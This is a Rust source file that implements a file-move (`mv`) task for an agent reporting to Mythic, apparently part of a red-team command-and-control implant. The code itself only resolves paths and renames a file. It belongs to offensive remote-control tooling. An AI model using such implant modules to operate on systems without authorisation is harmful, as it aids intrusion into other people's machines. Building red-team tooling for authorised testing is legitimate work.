use crate::agent::AgentTask;
use crate::mythic_success;
use crate::utils::unverbatim;
use serde::Deserialize;
use std::error::Error;
use std::path::Path;
use std::result::Result;

use path_clean::PathClean;

/// Struct containing the `mv` parameters
#[derive(Deserialize)]
struct MvArgs {
    /// Source path to move
    source: String,

    /// Destination path for the move
    destination: String,
}

/// Moves a file or directory from one location to another
/// * `task` - Task information
pub fn move_file(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    // Parse the task arguments
    let args: MvArgs = serde_json::from_str(&task.parameters)?;

    // Grab the source path
    let s_path = Path::new(&args.source);

    // Check if the source path exists
    if !s_path.exists() {
        return Err(Box::new(std::io::Error::other(
            "Source path does not exist.",
        )));
    }

    // Convert the source path into an absolute path
    let s_path = std::env::current_dir()?.join(s_path).canonicalize()?;

    // Grab the destination path
    let d_path = Path::new(&args.destination);

    // Convert the source path into an absolute path
    // if the path does not exist but is a directory, set the destination path to the
    // directory but with the file name being the source file name
    let d_path = if d_path.exists() {
        let d_path = d_path.canonicalize()?;
        if d_path.is_dir() {
            let fname = s_path.file_name().unwrap();
            d_path.join(fname)
        } else {
            d_path
        }
    } else {
        d_path.to_path_buf().clean()
    };

    // Move the file
    std::fs::rename(&s_path, &d_path)?;

    let s_path = unverbatim(s_path).to_string_lossy().to_string();
    let d_path = unverbatim(d_path).to_string_lossy().to_string();

    // Return the output to Mythic
    Ok(mythic_success!(
        task.id,
        format!("Moved '{}' to '{}'", s_path, d_path)
    ))
}
